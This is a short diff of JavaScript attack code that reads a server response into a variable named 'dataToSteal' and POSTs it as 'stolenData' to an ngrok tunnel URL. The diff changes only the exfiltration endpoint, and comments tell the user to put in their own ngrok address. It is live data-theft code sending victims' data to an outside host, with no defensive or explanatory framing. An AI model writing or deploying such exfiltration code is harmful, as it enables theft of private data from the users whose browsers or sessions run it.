@@ -18,7 +18,7 @@
                     var dataToSteal = xhr.responseText;
                     var stealXhr = new XMLHttpRequest();
                     // Update this URL to point to your ngrok URL
-                    stealXhr.open('POST', 'https://0793-105-96-84-144.ngrok-free.app/steal_data', true); // Replace with your ngrok URL
+                    stealXhr.open('POST', 'https://0793-105-96-84-144.ngrok-free.app', true); // Replace with your ngrok URL
                     stealXhr.setRequestHeader('Content-Type', 'application/json');
                     stealXhr.send(JSON.stringify({ stolenData: dataToSteal }));
                 } else {
